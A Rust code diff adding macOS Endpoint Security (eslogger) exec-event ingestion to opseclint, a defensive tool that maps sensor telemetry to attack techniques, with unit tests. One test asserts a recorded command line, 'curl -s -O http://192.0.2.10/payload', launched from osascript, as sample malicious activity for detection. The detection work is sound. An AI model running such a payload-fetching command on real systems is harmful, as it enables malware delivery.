@@ -5,7 +5,7 @@
 //! techniques, detectability, and coverage, answering "given what the sensor
 //! recorded, which techniques does this represent?"
 //!
-//! Two sources are supported, both reducing to the same `Command` the analyzer
+//! Three sources are supported, all reducing to the same `Command` the analyzer
 //! already understands so the matcher, report, and Sigma evaluation run
 //! unchanged — no new matching layer:
 //!
@@ -16,6 +16,10 @@
 //!   `SYSCALL` / `EXECVE` / `CWD` records of one event are reassembled by their
 //!   `audit(…)` id, the argv rebuilt from the `EXECVE` fields, and the program
 //!   taken from the `SYSCALL` `exe` path.
+//! - macOS **Endpoint Security** `NOTIFY_EXEC` events, as `eslogger exec` JSON.
+//!   The new image and argv come from `event.exec.target` / `event.exec.args`,
+//!   and — unlike auditd — the calling process (`process.executable.path`) gives
+//!   a real `ParentImage`.
 //!
 //! This is an *observation* front-end: it describes what a defender's sensor
 //! saw. Like the rest of opseclint it encodes detectability only, never evasion.
@@ -31,9 +35,8 @@ use serde_json::Value;
 
 use crate::parser::{self, Command};
 
-/// A telemetry format opseclint can ingest. Windows Sysmon EID 1 and Linux
-/// auditd `execve` are the current cuts; macOS/ESF lands as a further format
-/// behind the same `--telemetry` input path.
+/// A telemetry format opseclint can ingest. All three reduce to the same
+/// `Command` behind the same `--telemetry` input path.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
 pub enum Format {
     /// Windows Sysmon Event ID 1 (Process Create), JSON — a top-level array of
@@ -43,6 +46,10 @@ pub enum Format {
     /// multi-line `SYSCALL` / `EXECVE` / `CWD` records for one `execve`,
     /// reassembled by their `audit(…)` event id.
     Auditd,
+    /// macOS Endpoint Security `NOTIFY_EXEC` events, as `eslogger exec` JSON — a
+    /// top-level array, a single object, or JSONL. Carries the calling process,
+    /// so it supplies a real `ParentImage`.
+    Esf,
 }
 
 /// One ingested telemetry record reduced to the analyzer's unit shape: the
@@ -77,6 +84,7 @@ pub fn parse(text: &str, format: Format) -> Result<Ingest, String> {
     match format {
         Format::Sysmon => parse_sysmon(text),
         Format::Auditd => parse_auditd(text),
+        Format::Esf => parse_esf(text),
     }
 }
 
@@ -546,6 +554,104 @@ fn parse_kv(s: &str) -> HashMap<String, String> {
     out
 }
 
+// ---------------------------------------------------------------------------
+// macOS Endpoint Security (eslogger)
+// ---------------------------------------------------------------------------
+
+/// Ingest macOS Endpoint Security `NOTIFY_EXEC` telemetry, as produced by
+/// `eslogger exec` — a top-level JSON array, a single object, or JSONL, read by
+/// the same [`read_events`] the Sysmon path uses. Every record carrying an
+/// `event.exec` object is a process execution; anything else (an `open`, a
+/// `fork`) is skipped and counted.
+///
+/// ESF exec semantics: `event.exec.target` is the *new* process (its
+/// `executable.path` and `event.exec.args` are the launched image and argv),
+/// while the message's top-level `process` is the caller that invoked `exec` —
+/// so its `executable.path` is the parent image a defender's rules key on. That
+/// is what lets ESF resolve `ParentImage`-keyed detections where auditd cannot.
+fn parse_esf(text: &str) -> Result<Ingest, String> {
+    let events = read_events(text)?;
+    let mut observations = Vec::new();
+    let mut skipped = 0;
+    for (i, ev) in events.iter().enumerate() {
+        match reduce_esf(ev) {
+            Some(fields) => match execution_from_fields(&fields) {
+                Some((commands, raw)) => observations.push(Observation {
+                    record: i + 1,
+                    commands,
+                    raw,
+                    event: Arc::new(fields),
+                }),
+                None => skipped += 1,
+            },
+            None => skipped += 1,
+        }
+    }
+    Ok(Ingest {
+        observations,
+        skipped,
+    })
+}
+
+/// Reduce one ESF message to a canonical field map, or `None` when it is not an
+/// exec event. `Image` / `CommandLine` / `CurrentDirectory` come from the new
+/// process (`event.exec.target` / `args` / `cwd`); `ParentImage` from the calling
+/// process that invoked exec.
+fn reduce_esf(ev: &Value) -> Option<HashMap<String, String>> {
+    let exec = ev.get("event")?.get("exec")?;
+    if !exec.is_object() {
+        return None;
+    }
+    let mut fields = HashMap::new();
+    if let Some(image) = nested_str(exec, &["target", "executable", "path"]) {
+        insert_nonempty(&mut fields, "Image", image);
+    }
+    let cmdline = join_json_args(exec.get("args"));
+    if !cmdline.is_empty() {
+        fields.insert("CommandLine".to_string(), cmdline);
+    }
+    if let Some(cwd) = nested_str(exec, &["cwd", "path"]) {
+        insert_nonempty(&mut fields, "CurrentDirectory", cwd);
+    }
+    if let Some(parent) = nested_str(ev, &["process", "executable", "path"]) {
+        insert_nonempty(&mut fields, "ParentImage", parent);
+    }
+    Some(fields)
+}
+
+/// Join a JSON array of argv strings into a command line, re-quoting each element
+/// (via [`shell_quote_arg`]) so the shared reducer's re-tokenization preserves
+/// the exact boundaries the sensor recorded — the same concern as auditd argv.
+fn join_json_args(args: Option<&Value>) -> String {
+    let Some(items) = args.and_then(Value::as_array) else {
+        return String::new();
+    };
+    items
+        .iter()
+        .filter_map(Value::as_str)
+        .map(shell_quote_arg)
+        .collect::<Vec<_>>()
+        .join(" ")
+}
+
+/// Follow a chain of object keys to a string leaf, or `None` if any hop is
+/// missing or the leaf is not a string.
+fn nested_str<'a>(v: &'a Value, path: &[&str]) -> Option<&'a str> {
+    let mut cur = v;
+    for key in path {
+        cur = cur.get(key)?;
+    }
+    cur.as_str()
+}
+
+/// Insert `key` only when `value` is non-empty, keeping empty sensor fields from
+/// masking a synthesized fallback in `execution_from_fields`.
+fn insert_nonempty(fields: &mut HashMap<String, String>, key: &str, value: &str) {
+    if !value.is_empty() {
+        fields.insert(key.to_string(), value.to_string());
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -567,6 +673,10 @@ mod tests {
 
     fn lnx_kb() -> KnowledgeBase {
         kb::load(kb::Platform::LinuxAuditd).expect("linux KB must parse")
+    }
+
+    fn mac_kb() -> KnowledgeBase {
+        kb::load(kb::Platform::MacosEs).expect("macos KB must parse")
     }
 
     fn ids(report: &crate::model::Report) -> Vec<String> {
@@ -828,5 +938,68 @@ type=EXECVE msg=audit(1.0:1): argc=4 a0=\"grep\" a1=\"-r\" a2=68656c6c6f20776f72
     fn empty_auditd_input_is_a_clear_error() {
         assert!(parse("", Format::Auditd).is_err());
         assert!(parse("---- \n#comment\n", Format::Auditd).is_err());
+    }
+
+    // --- macOS Endpoint Security (eslogger) --------------------------------
+
+    #[test]
+    fn ingests_esf_exec_and_skips_non_exec() {
+        let ingest = parse(&fixture("esf-exec.jsonl"), Format::Esf).expect("parses");
+        // Three exec events (curl, whoami, sw_vers); the lone open event is
+        // skipped, and record numbers follow source position (sw_vers is #4).
+        assert_eq!(ingest.observations.len(), 3);
+        assert_eq!(ingest.skipped, 1);
+        assert_eq!(
+            ingest
+                .observations
+                .iter()
+                .map(|o| o.record)
+                .collect::<Vec<_>>(),
+            vec![1, 2, 4]
+        );
+    }
+
+    #[test]
+    fn analyzes_ingested_esf_events_via_the_existing_matcher() {
+        let ingest = parse(&fixture("esf-exec.jsonl"), Format::Esf).expect("parses");
+        let report = analyzer::analyze_telemetry(&ingest.observations, &mac_kb());
+        let ids = ids(&report);
+        assert!(ids.contains(&"curl".to_string()));
+        assert!(ids.contains(&"whoami".to_string()));
+        assert!(ids.contains(&"sw-vers".to_string()));
+    }
+
+    #[test]
+    fn esf_reduces_target_argv_and_carries_the_calling_parent() {
+        let ingest = parse(&fixture("esf-exec.jsonl"), Format::Esf).expect("parses");
+        // Event 1 (curl): image/argv/cwd come from event.exec.target, and the
+        // parent image from the calling process (process.executable.path).
+        let curl = &ingest.observations[0];
+        assert_eq!(curl.commands[0].program, "curl");
+        assert_eq!(curl.raw, "curl -s -O http://192.0.2.10/payload");
+        assert_eq!(
+            curl.event.get("Image").map(String::as_str),
+            Some("/usr/bin/curl")
+        );
+        assert_eq!(
+            curl.event.get("CurrentDirectory").map(String::as_str),
+            Some("/Users/analyst")
+        );
+        // The ParentImage a command line can't supply — ESF's payoff.
+        assert_eq!(
+            curl.event.get("ParentImage").map(String::as_str),
+            Some("/usr/bin/osascript")
+        );
+    }
+
+    #[test]
+    fn empty_esf_input_is_a_clear_error() {
+        assert!(parse("", Format::Esf).is_err());
+        // A well-formed non-exec event yields zero observations (all skipped),
+        // not an error.
+        let open = r#"{"event":{"open":{"file":{"path":"/x"}}}}"#;
+        let ingest = parse(open, Format::Esf).expect("parses");
+        assert_eq!(ingest.observations.len(), 0);
+        assert_eq!(ingest.skipped, 1);
     }
 }
